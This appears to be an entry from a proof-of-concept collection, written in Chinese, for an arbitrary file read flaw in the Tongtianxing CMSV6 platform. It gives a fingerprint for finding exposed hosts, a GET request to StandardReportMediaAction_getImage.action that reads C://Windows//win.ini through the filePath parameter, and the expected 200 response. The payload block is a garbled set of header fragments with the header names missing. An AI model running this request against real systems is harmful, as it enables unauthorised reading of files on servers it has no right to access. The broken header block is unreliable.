# 通天星CMSV6-StandardReportMediaAction_getImage存在任意文件读取漏洞

通天星 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/808gps/`
- **请求**：`GET /808gps/StandardReportMediaAction_getImage.action?filePath=C://Windows//win.ini&fileOffset=1&fileSize=100 HTTP/1.1`

**Payload**
```
Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type:
application/x-www-form-urlencoded
Content-Length: 0
```
- **响应特征**：200